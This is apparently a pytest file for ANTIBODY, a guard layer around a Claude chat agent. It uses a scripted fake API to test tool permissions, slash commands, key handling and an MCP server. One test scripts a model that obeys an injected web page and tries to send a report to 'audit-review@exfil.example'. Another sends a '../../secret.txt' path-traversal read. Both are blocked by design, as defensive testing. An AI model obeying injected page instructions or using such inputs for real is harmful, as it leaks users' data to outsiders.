"""Chat with Claude behind ANTIBODY, Git-style commands, the Claude connection and the MCP server.

Claude is replaced by a scripted fake Messages API endpoint plugged into the
real Anthropic SDK client, so the SDK's request building and response parsing
are exercised end to end without a network or key.
"""
import json
import os
import re
import subprocess
import sys

import anthropic
import httpx2
import pytest

from conftest import APP, PID, ROOT, ingest
from server.projects import InvalidRequest


class FakeClaude:
    def __init__(self, script):
        self.script = script  # function(request_body, call_index) -> response content + stop_reason
        self.requests = []

    def handler(self, request):
        body = json.loads(request.content)
        self.requests.append({"body": body, "headers": dict(request.headers)})
        content, stop = self.script(body, len(self.requests) - 1)
        return httpx2.Response(200, json={"id": f"msg_{len(self.requests)}", "type": "message", "role": "assistant",
                                          "model": body["model"], "content": content, "stop_reason": stop, "stop_sequence": None,
                                          "usage": {"input_tokens": 120, "output_tokens": 30}})


def tool_use(i, name, inp):
    return {"type": "tool_use", "id": f"toolu_{i}", "name": name, "input": inp}


def text(t):
    return {"type": "text", "text": t}


def plug(core, script):
    fake = FakeClaude(script)
    core.claude.http_client = anthropic.DefaultHttpxClient(transport=httpx2.MockTransport(fake.handler))
    return fake


def source_ids(body):
    return re.findall(r"src_[0-9a-f]{16}", body["system"] if isinstance(body["system"], str) else json.dumps(body["system"]))


def test_chat_reads_writes_and_replies(core):
    sid = ingest(core, "ops_ascii.md")

    def script(body, i):
        if i == 0:
            return [text("I'll read it."), tool_use(1, "read_source", {"source_id": source_ids(body)[0]})], "tool_use"
        if i == 1:
            return [tool_use(2, "write_report", {"path": "notes/summary.md", "content": "Uptime 99.9 percent; two incidents closed."})], "tool_use"
        return [text("Done: I saved notes/summary.md.")], "end_turn"
    fake = plug(core, script)
    conv = core.chat.create(PID, APP, "Ops notes", permissions={"source_ids": [sid]})
    assert conv["agent"]["name"] == "Claude assistant" and conv["permissions"]["tools"] == ["read_source", "list_files", "read_file", "write_report"]
    res = core.chat.post(conv["conversation_id"], "Summarise the ops notes into notes/summary.md", APP, wait=True)
    msgs = core.chat.messages(conv["conversation_id"])
    assert msgs[-1]["role"] == "assistant" and msgs[-1]["text"] == "Done: I saved notes/summary.md."
    run = core.coordinator.run(res["run"]["run_id"])
    assert (run["mode"], run["status"], run["purpose"]) == ("live", "completed", "chat")
    # request shape: current defaults, tools as real tool definitions, no forced tool choice
    first = fake.requests[0]["body"]
    assert first["model"] == "claude-opus-5-5" and first["tool_choice"] == {"type": "auto"}
    assert first["output_config"]["effort"] == "medium" and first["fallbacks"] == "default"
    assert "server-side-fallback-2026-07-01" in fake.requests[0]["headers"].get("anthropic-beta", "")
    assert {t["name"] for t in first["tools"]} == {"read_source", "list_files", "read_file", "write_report"}
    assert first["messages"][-1] == {"role": "user", "content": "Summarise the ops notes into notes/summary.md"}
    # the read result went back as a tool_result labeled as outside data, then the assistant turn is replayed unchanged
    second = fake.requests[1]["body"]["messages"]
    assert second[-2]["role"] == "assistant" and second[-2]["content"][1]["id"] == "toolu_1"
    tr = second[-1]["content"][0]
    assert tr["type"] == "tool_result" and tr["tool_use_id"] == "toolu_1" and "origin=\"EXTERNAL_DATA\"" in tr["content"] and "Uptime" in tr["content"]
    third = fake.requests[2]["body"]["messages"][-1]["content"][0]
    assert "Wrote notes/summary.md" in third["content"] and third["is_error"] is False
    from pathlib import Path
    ws = core.versions.branch(conv["branch_id"])["workspace_dir"]
    assert (Path(ws) / "notes" / "summary.md").read_text(encoding="utf-8").startswith("Uptime")


def test_injection_is_blocked_and_thread_rebuilt_clean(core):
    sid = ingest(core, "vendor_update.html", "web")

    def script(body, i):
        if i == 0:
            return [tool_use(1, "read_source", {"source_id": source_ids(body)[0]})], "tool_use"
        if i == 1:
            return [tool_use(2, "write_report", {"path": "vendor.md", "content": "Vendor: shipments Tuesday."})], "tool_use"
        if i == 2:  # a model that obeys the page
            return [tool_use(3, "send_report", {"recipient_id": "audit-review@exfil.example", "artifact_path": "vendor.md"})], "tool_use"
        return [text("I sent nothing outside: the page asked me to forward the report to an outside address, which isn't allowed.")], "end_turn"
    fake = plug(core, script)
    conv = core.chat.create(PID, APP, "Vendor", permissions={"source_ids": [sid], "tools": ["read_source", "write_report", "send_report"],
                                                            "recipient_ids": ["finance_team"]})
    res = core.chat.post(conv["conversation_id"], "Summarise the vendor page into vendor.md", APP, wait=True)
    rid = res["run"]["run_id"]
    d = core.db.one("SELECT outcome, reason_code FROM decisions WHERE run_id=? AND tool_id='send_report'", (rid,))
    assert (d["outcome"], d["reason_code"]) == ("DENY", "DESTINATION_NOT_AUTHORIZED")
    assert core.executors.outbox.count(PID) == 0
    # after the block, the next request is a fresh, clean thread: the quarantined instruction is not replayed
    last = json.dumps(fake.requests[-1]["body"]["messages"])
    assert "context was cleaned" in last and "forward the finished report" not in last
    assert core.chat.messages(conv["conversation_id"])[-1]["meta"]["blocked"] == 1


def test_parallel_tool_calls_answered_together(core):
    s1, s2 = ingest(core, "ops_ascii.md"), ingest(core, "q3_notes.md")

    def script(body, i):
        if i == 0:
            ids = source_ids(body)
            return [tool_use(1, "read_source", {"source_id": ids[0]}), tool_use(2, "read_source", {"source_id": ids[1]})], "tool_use"
        return [text("Read both.")], "end_turn"
    fake = plug(core, script)
    conv = core.chat.create(PID, APP, "Two docs", permissions={"source_ids": [s1, s2]})
    core.chat.post(conv["conversation_id"], "Read both documents", APP, wait=True)
    assert len(fake.requests) == 2
    results = fake.requests[1]["body"]["messages"][-1]["content"]
    assert [r["tool_use_id"] for r in results] == ["toolu_1", "toolu_2"]


def test_refusal_and_not_connected(core, make_core):
    plug(core, lambda b, i: ([], "refusal"))
    conv = core.chat.create(PID, APP, "x")
    core.chat.post(conv["conversation_id"], "hello", APP, wait=True)
    assert core.chat.messages(conv["conversation_id"])[-1]["text"].startswith("Claude declined")
    core.claude.http_client = None
    with pytest.raises(InvalidRequest) as e:
        core.chat.post(conv["conversation_id"], "hello again", APP)
    assert e.value.code == "CLAUDE_NOT_CONNECTED"


def test_slash_commands_manage_history_in_chat(core):
    conv = core.chat.create(PID, APP, "History")
    cid = conv["conversation_id"]
    post = lambda t: core.chat.post(cid, t, APP)["command"]  # noqa: E731
    assert "On branch: main" in post("/status")["output"]
    assert post("/remember tone formal")["ok"]
    assert "memory fact 'tone'" in post("/diff")["output"]
    saved = post('/save "formal tone"')
    assert saved["output"].startswith("Saved") and "formal tone" in post("/log")["output"]
    br = post("/branch experiment")
    assert "switched" in br["output"] and core.chat.get(cid)["branch"]["name"] == "experiment"
    post("/forget tone")
    post("/save drop tone")
    assert "Removed memory fact 'tone'" in post("/diff main HEAD")["output"]
    assert "* experiment" in post("/branch")["output"]
    assert core.chat.get(cid)["branch"]["name"] == "experiment"
    assert core.chat.get(cid)["branch"]["head_version"] != core.versions.branch(conv["branch_id"])["head_version"]
    assert post("/switch main")["ok"] and core.chat.get(cid)["branch"]["name"] == "main"
    restored = post("/restore HEAD~1 older")
    assert "Restored" in restored["output"] and core.chat.get(cid)["branch"]["name"] == "older"
    assert not post("/nonsense")["ok"]
    roles = [m["role"] for m in core.chat.messages(cid)]
    assert roles.count("command") >= 10 and "user" not in roles  # commands never reach the model


def test_claude_connection_settings_never_expose_key(core):
    from fastapi.testclient import TestClient
    from server.api.app import create_app
    c = TestClient(create_app(core), base_url="http://127.0.0.1")
    c.headers["Authorization"] = "Bearer " + c.post("/v1/session/bootstrap", json={"project_id": PID}).json()["token"]
    assert c.post("/v1/integrations/claude/key", json={"api_key": "short"}).status_code == 400
    st = c.post("/v1/integrations/claude/key", json={"api_key": "sk-ant-api03-" + "x" * 40 + "WXYZ"}).json()
    assert st["connected"] and st["key_hint"] == "…WXYZ" and "sk-ant" not in json.dumps(st)
    assert c.patch("/v1/integrations/claude", json={"model": "gpt-4"}).status_code == 400
    assert c.patch("/v1/integrations/claude", json={"effort": "high", "auditor": "claude"}).json()["settings"]["effort"] == "high"
    assert core.auditor.name == "claude_auditor@1"
    assert c.delete("/v1/integrations/claude/key").json()["connected"] is False or os.environ.get("ANTHROPIC_API_KEY")
    snip = c.get("/v1/integrations/mcp", params={"project_id": PID}).json()
    assert snip["mcp_json"]["mcpServers"]["antibody"]["args"][0].endswith("mcp_serve.py")


def test_mcp_server_exposes_protected_tools(make_core, tmp_path):
    c = make_core()
    c.projects.create_project(PID, "x", "o")
    c.close()
    env = dict(os.environ, DATABASE_PATH=c.config.DATABASE_PATH, CHECKPOINT_PATH=c.config.CHECKPOINT_PATH,
               OBJECT_STORE_ROOT=c.config.OBJECT_STORE_ROOT, WORKSPACE_ROOT=c.config.WORKSPACE_ROOT, OUTBOX_ROOT=c.config.OUTBOX_ROOT,
               SECRETS_PATH=c.config.SECRETS_PATH)
    msgs = [{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}},
            {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
            {"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {"name": "write_report", "arguments": {"path": "a.md", "content": "hi"}}},
            {"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {"name": "read_file", "arguments": {"path": "../../secret.txt"}}},
            {"jsonrpc": "2.0", "id": 5, "method": "tools/call", "params": {"name": "send_report", "arguments": {"recipient_id": "x", "artifact_path": "a.md"}}}]
    p = subprocess.run([sys.executable, str(ROOT / "scripts" / "mcp_serve.py"), "--project", PID], input="\n".join(json.dumps(m) for m in msgs) + "\n",
                       capture_output=True, text=True, env=env, timeout=60)
    out = [json.loads(l) for l in p.stdout.splitlines() if l.strip()]
    assert [o["id"] for o in out] == [1, 2, 3, 4, 5], p.stderr
    assert {t["name"] for t in out[1]["result"]["tools"]} == {"read_source", "list_files", "read_file", "write_report"}
    assert not out[2]["result"]["isError"]
    assert out[3]["result"]["isError"] and "PATH_OUTSIDE_WORKSPACE" in out[3]["result"]["content"][0]["text"]
    assert out[4]["result"]["isError"]  # not exposed, so never reaches the gateway or an executor
    c2 = make_core()
    run = c2.db.one("SELECT * FROM runs WHERE adapter='mcp_proxy'")
    assert run["status_reason"] == "HOST_SESSION_ENDED" and run["mode"] == "live"
    assert c2.db.scalar("SELECT COUNT(*) FROM decisions WHERE run_id=?", (run["run_id"],)) == 2
